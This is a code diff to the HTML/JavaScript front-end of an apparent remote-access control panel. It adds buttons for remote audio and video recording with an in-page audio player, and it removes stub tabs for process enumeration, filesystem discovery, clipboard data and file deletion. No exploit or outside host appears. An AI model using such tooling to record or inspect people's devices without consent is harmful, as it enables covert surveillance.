@@ -322,26 +322,11 @@ table { width: 100%; border-collapse: collapse; }
             </div>
             <div id="camera" class="tab-content">
                 <h2>Camera</h2>
-                <button id = "start_record_audio" class="screenshot-button" onclick="startaudio()">Start record audio</button>
-                <button id = "stop_record_audio" class="screenshot-button" onclick="stopaudio()">Stop record audio</button>
-                <button id = "start_record_video" class="screenshot-button" onclick="startvideo()">Start record video</button>
-                <button id = "start_record_video" class="screenshot-button" onclick="stopvideo()">Stop record video</button>
-            </div>
-            <div id="process" class="tab-content">
-                <h2>Process Enumeration</h2>
-                <p>This tab is for enumerating processes.</p>
-            </div>
-            <div id="filesystem" class="tab-content">
-                <h2>Filesystem Discovery</h2>
-                <p>This tab is for filesystem discovery.</p>
-            </div>
-            <div id="clipboard" class="tab-content">
-                <h2>Clipboard Data</h2>
-                <p>This tab shows clipboard data.</p>
-            </div>
-            <div id="delete" class="tab-content">
-                <h2>Delete File</h2>
-                <p>This tab is for deleting files.</p>
+                <div class="button-container">
+                    <button id="start_record_audio" class="screenshot-button" onclick="startaudio()">Start record audio</button>
+                    <button id="stop_record_audio" class="screenshot-button" onclick="stopaudio()">Stop record audio</button>
+                    <button id="record_video_b" class="screenshot-button" onclick="record_video()">Record video</button>
+                </div>
             </div>
         </div>
     </div>
@@ -801,22 +786,26 @@ table { width: 100%; border-collapse: collapse; }
         });
 
         function startaudio() {
-            fetch('/api', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ action: 'start_record_audio' })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === true) {
-                        alert(`Record started`);
-                    } else {
-                        alert(`Failed to start recording`);
-                    }
-                });
-                check_record_status();
+            if (confirm(`Start record audio?`)) {
+                fetch('/api', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ action: 'start_record_audio' })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === true) {
+                            alert(`Record started`);
+                        } else {
+                            alert(`Failed to start recording`);
+                        }
+                    })
+                    .finally(() => {
+                        check_record_status();                    
+                    });                
+            }
         };
 
         function stopaudio() {
@@ -832,13 +821,14 @@ table { width: 100%; border-collapse: collapse; }
                 .then(data => {
                     if (data.status === 'OK') {
                         // window.location.href = data.url;
-                        const downloadLink = document.createElement('a');
-                        downloadLink.href = data.url; // URL from the response (e.g., '/artifacts/andr.crt')
-                        downloadLink.download = data.url.split('/').pop(); // Extract file name from the URL for the download
-                        document.body.appendChild(downloadLink);
-                        downloadLink.click();
-                        document.body.removeChild(downloadLink);
+                        // const downloadLink = document.createElement('a');
+                        // downloadLink.href = data.url; // URL from the response (e.g., '/artifacts/andr.crt')
+                        // downloadLink.download = data.url.split('/').pop(); // Extract file name from the URL for the download
+                        // document.body.appendChild(downloadLink);
+                        // downloadLink.click();
+                        // document.body.removeChild(downloadLink);
                         check_record_status();
+                        addAudioPlayer(data.url);
                     }
                 });
                 } catch (error) {
@@ -861,24 +851,100 @@ table { width: 100%; border-collapse: collapse; }
                     rec_aud_status = data.status;
                     let button = document.getElementById("stop_record_audio");
                     let button2 = document.getElementById("start_record_audio");
+                    let button3 = document.getElementById("record_video_b");
 
-                    if (data.status) {
-                        button.disabled = false;
-                        button.classList.remove("blocked");
-                        button2.disabled = true;
-                        button2.classList.add("blocked");  
-                    } else {
-                        button2.disabled = false;
-                        button2.classList.remove("blocked");
+
+                    if (data.status === "error") {
                         button.disabled = true;
-                        button.classList.add("blocked");                        
+                        button.classList.add("blocked");
+                        button2.disabled = true;
+                        button2.classList.add("blocked");
+                        button3.disabled = true;
+                        button3.classList.add("blocked");
+                    } else {
+                        button3.disabled = false;
+                        button3.classList.remove("blocked");
+                        if (data.status) {
+                            button.disabled = false;
+                            button.classList.remove("blocked");
+                            button2.disabled = true;
+                            button2.classList.add("blocked");  
+                        } else {
+                            button2.disabled = false;
+                            button2.classList.remove("blocked");
+                            button.disabled = true;
+                            button.classList.add("blocked");                        
+                        }                        
                     }
+
 
                 });
                 } catch (error) {
                 console.error('Error downloading wav file:', error);
             }
         }
+
+        function record_video() {
+            if (confirm(`Start record video?`)) {
+            let button = document.getElementById("record_video_b");
+            button.disabled = true;
+            button.classList.add("blocked");
+            try {
+                fetch('/api', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ action: 'record_video'})
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'OK') {
+                        // window.location.href = data.url;
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = data.url; // URL from the response (e.g., '/artifacts/andr.crt')
+                        downloadLink.download = data.url.split('/').pop(); // Extract file name from the URL for the download
+                        document.body.appendChild(downloadLink);
+                        downloadLink.click();
+                        document.body.removeChild(downloadLink);
+                        check_record_status();
+                    }
+                })
+                .finally(() => {
+                    // Розблокування кнопки після завершення запиту (успішно чи ні)
+                    button.disabled = false;
+                    button.classList.remove("blocked");
+                });
+                } catch (error) {
+                console.error('Error downloading wav file:', error);
+            }
+        }
+        }
+
+        function addAudioPlayer(audioPath) {
+            const cameraDiv = document.getElementById("camera");
+
+            // Перевіряємо, чи вже є плеєр
+            let existingPlayer = document.getElementById("audioPlayer");
+            if (existingPlayer) {
+                // Якщо є, просто змінюємо джерело аудіо
+                existingPlayer.querySelector("source").src = audioPath;
+                existingPlayer.load(); // Перезавантажуємо аудіо
+            } else {
+                // Створюємо новий плеєр
+                const audioPlayer = document.createElement("audio");
+                audioPlayer.id = "audioPlayer";
+                audioPlayer.controls = true; // Додаємо елементи управління
+
+                const source = document.createElement("source");
+                source.src = audioPath; // Вказуємо шлях до аудіо
+                source.type = "audio/mpeg"; // Тип файлу
+
+                audioPlayer.appendChild(source);
+                cameraDiv.appendChild(audioPlayer); // Додаємо плеєр до div
+            }
+        }
+
     </script>
 </body>
 </html>
